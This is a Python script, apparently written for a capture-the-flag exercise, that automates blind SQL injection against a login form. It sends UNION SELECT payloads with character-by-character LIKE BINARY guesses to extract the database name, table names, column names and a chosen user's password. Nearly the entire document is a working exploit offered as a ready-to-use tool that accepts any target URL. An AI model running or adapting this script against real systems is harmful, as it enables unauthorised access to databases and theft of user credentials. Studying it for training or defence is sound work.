"""
This script will enumerate a vulnerable target to identify database, table, column names and passwords.

The "charset" value can be modified to any string you choose and the script will enumerate through it.

Contains some hardcoded logic, like expecting a "Welcome" string or column names like username and password. The 
reason is that this was made for a CTF where the database had this logic.

Could be improved for handling network errors or unexpected results. 
"""
import requests
import sys

def enum_db(url, db_name="", table_name="", column_name="", column_enum="", username=""):
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _'
    length = len(charset)
    i = 0
    char = ""
    print_text = ""
    sqli = ""
    
    if not db_name:
        sqli = "' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '"
        print_text = "Database name: "
    elif db_name and not table_name:
        sqli = f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = '{db_name}' AND table_name LIKE BINARY '"
        print_text = "Table name: "
        print("")
    elif table_name and not column_name:
        sqli = f"' UNION SELECT 1,2,3,4 FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' AND column_name LIKE BINARY '"
        print_text = "Column name: "
        print("")
    elif column_enum and not username:
        sqli = f"' UNION SELECT 1,2,3,4 FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' {column_enum} '"
        print_text = "Column name: "
        print("")
    elif column_name and username:
        sqli = f"' UNION SELECT 1,2,3,4 FROM {table_name} WHERE username='{username}' AND password LIKE BINARY '"
        print_text = f"{username}'s Password: "
        print("")

    while i < length:
        data = {
            'username': sqli + char + charset[i] + "%' -- -",
            'password': 'a'
        }
        req = requests.post(url, data=data)
        if "Welcome" in req.text:
            char = char + charset[i]
            i = 0
        else:
            sys.stdout.write(f"\r{print_text}{char}{charset[i]}")
            sys.stdout.flush()
            i += 1
    if char:
        sys.stdout.write(f"\r{print_text}{char} ")
        return char
    else:
        sys.stdout.write(f"\r{print_text}Failed to extract anything")
        return False

def get_database_name(url):
    return enum_db(url)

def get_table_name(url, db_name):
    return enum_db(url, db_name)

def get_column_name(url, db_name, table_name):
    return enum_db(url, db_name, table_name)

def enumerate_additional_columns(url, db_name, table_name, initial_column):
    column_list = [initial_column]
    while True:
        column_enum = ""
        for column in column_list:
            column_enum += f" AND column_name!='{column}'"
        column_enum += "AND column_name LIKE BINARY"
        new_column = enum_db(url, db_name, table_name, "a", column_enum)
        if new_column:
            column_list.append(new_column)
        else:
            break
    return column_list, column_enum

def prompt_and_enumerate_password(url, db_name, table_name, column_enum):
    while True:
        which_col = input("\nWhich column would you like to enumerate: ") 
        if which_col in column_enum:
            if which_col == "password":
                username = input("What username: ")
                enum_db(url, db_name, table_name, which_col, "no enum", username)
                break

def main():
    url = input("Input url to enumerate on: ") 
    db_name = get_database_name(url)
    if db_name:
        table_name = get_table_name(url, db_name)
        if table_name:
            column_name = get_column_name(url, db_name, table_name)
            if column_name:
                columns, column_enum = enumerate_additional_columns(url, db_name, table_name, column_name)
                prompt_and_enumerate_password(url, db_name, table_name, column_enum)

if __name__ == "__main__":
    main()
